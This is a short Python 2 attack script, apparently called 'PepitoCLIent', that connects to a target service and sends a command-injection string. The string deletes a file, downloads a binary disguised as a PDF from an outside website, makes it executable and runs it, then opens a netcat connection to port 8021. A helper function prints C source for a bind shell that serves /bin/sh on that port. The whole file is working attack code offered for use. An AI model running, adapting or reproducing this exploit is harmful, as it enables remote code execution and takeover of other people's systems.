#!/usr/bin/python

###################################################
# PepitoCLIent v0.1a -- Zerk's Inside		  #
# Edited by PEPITO DE LU			  #
###################################################

import socket
import sys
import os

def show_code():
	print "\n#include <sys/socket.h>"
	print "#include <arpa/inet.h>"
	print "\nextern char **environ;"
	print "\nint main()"
	print "{"
	print "  int sock;"
	print "  struct sockaddr_in sa;"
	print "\n  sa.sin_family = AF_INET;"
	print "  sa.sin_port = htons(8021);"
	print "  sa.sin_addr.s_addr = htonl(INADDR_ANY);"
	print "  sock = socket(PF_INET, SOCK_STREAM, 0);"
	print "  bind(sock, (struct sockaddr *)(&sa), sizeof sa);"
	print "  listen(sock, 5);"
	print "  sock = accept(sock, 0, 0);"
	print "  dup2(sock, 0);"
	print "  dup2(sock, 1);"
	print "  dup2(sock, 2);"
	print "  execve(\"/bin/sh\", 0, environ);"
	print "  return (0);"
	print "}"

def main():
	if (len(sys.argv) < 3):
		print("Usage : " + sys.argv[0]  + " <host> <port>")
	else:
		sys.stdout.write("[+] \033[33mConnection ...\033[00m              ")
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect((sys.argv[1], int(sys.argv[2])))
			print "[\033[32mOK\033[0m]"
			sys.stdout.write("[+] \033[33mSend malicious code ...     \033[00m")
			if len(sys.argv) == 4 and sys.argv[3] == "code":
				show_code()
			code = ";rm -f lastvisit_;wget -q http://www.lycees-de-sens.fr/pdf/infos/janot_internes_150.pdf -O ~/.test;chmod u+x ~/.test; ~/.test &"
			sock.send("3 " + str(len(code)) + code)
			print "[\033[32mOK\033[0m]"
			sys.stdout.write("[+] \033[33mConnection to the N3WB13... \033[00m[\033[32mOK\033[0m]\n")
			sys.stdout.write("[+] \033[33mExecuting \033[01mnc " + sys.argv[1] + " 8021\033[00m\n")
			os.system("nc " + sys.argv[1] + " 8021  || echo \"[\033[31mFailure\033[0m]\"")
		except Exception as e:
			print "[\033[31mFailure\033[0m]"

if __name__ == "__main__":
    main()
